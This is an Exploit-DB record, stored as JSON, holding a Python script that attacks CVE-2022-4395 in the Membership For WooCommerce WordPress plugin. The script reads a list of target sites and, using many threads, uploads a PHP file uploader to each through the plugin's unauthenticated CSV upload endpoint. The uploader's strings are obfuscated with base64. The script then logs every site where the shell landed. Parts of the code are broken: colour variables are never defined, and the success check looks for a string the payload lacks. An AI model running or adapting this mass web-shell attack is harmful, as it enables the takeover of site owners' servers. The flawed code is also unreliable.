{"source": "https://www.exploit-db.com/exploits/51959", "vulnName": "Wordpress Plugin - Membership For WooCommerce < v2.1.7 - Arbitrary File Upload to Shell (Unauthenticated)", "vulnEDBID": "51959", "vulnCVE": "2022-4395", "author": "MILAD KARIMI", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Wordpress Plugin - Membership For WooCommerce < v2.1.7 - Arbitrary File Upload to Shell (Unauthenticated)\n# Date: 2024-02-25\n# Author: Milad Karimi (Ex3ptionaL)\n# Category : webapps\n# Tested on: windows 10 , firefox\n\nimport sys , requests, re , json\nfrom multiprocessing.dummy import Pool\nfrom colorama import Fore\nfrom colorama import init\ninit(autoreset=True)\n\nheaders = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0',\n'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozlila/5.0 (Linux;\nAndroid 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like\nGecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 'Accept':\n'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',\n'Accept-Encoding': 'gzip, deflate', 'Accept-Language':\n'en-US,en;q=0.9,fr;q=0.8', 'referer': 'www.google.com'}\n\nuploader = \"\"\"\nGIF89a\n<?php ?>\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Resultz</title>\n</head>\n<body><h1>Uploader</h1>\n  <form enctype='multipart/form-data' action='' method='POST'>\n    <p>Uploaded</p>\n    <input type='file' name='uploaded_file'></input><br />\n    <input type='submit' value='Upload'></input>\n  </form>\n</body>\n</html>\n<?PHP\nif(!empty($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')])){$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485=base64_decode('Li8=');$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485=$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485.basename($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('bmFtZQ==')]);if(move_uploaded_file($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('dG1wX25hbWU=')],$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485)){echo\nbase64_decode('VGhlIGZpbGUg').basename($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('bmFtZQ==')]).base64_decode('IGhhcyBiZWVuIHVwbG9hZGVk');}else{echo\nbase64_decode('VGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB0aGUgZmlsZSwgcGxlYXNlIHRyeSBhZ2FpbiE=');}}?>\n\"\"\"\nrequests.urllib3.disable_warnings()\n\ndef Exploit(Domain):\n    try:\n        if 'http' in Domain:\n          Domain = Domain\n        else:\n          Domain = 'http://'+Domain\n        myup = {'': ('db.php', uploader)}\n        req = requests.post(Domain +\n'/wp-admin/admin-ajax.php?action=wps_membership_csv_file_upload',\nfiles=myup, headers=headers,verify=False, timeout=10).text\n        req1 = requests.get(Domain +\n'/wp-content/uploads/mfw-activity-logger/csv-uploads/db.php')\n        if 'Ex3ptionaL' in req1:\n          print (fg+'[+] '+ Domain + ' --> Shell Uploaded')\n          open('Shellz.txt', 'a').write(Domain +\n'/wp-content/uploads/mfw-activity-logger/csv-uploads/db.php' + '\\n')\n        else:\n          print (fr+'[+] '+ Domain + '{}{} --> Not Vulnerability')\n    except:\n        print(fr+' -| ' + Domain + ' --> {} [Failed]')\n\ntarget = open(input(fm+\"Site List: \"), \"r\").read().splitlines()\nmp = Pool(int(input(fm+\"Threads: \")))\nmp.map(Exploit, target)\nmp.close()\nmp.join()\n            "}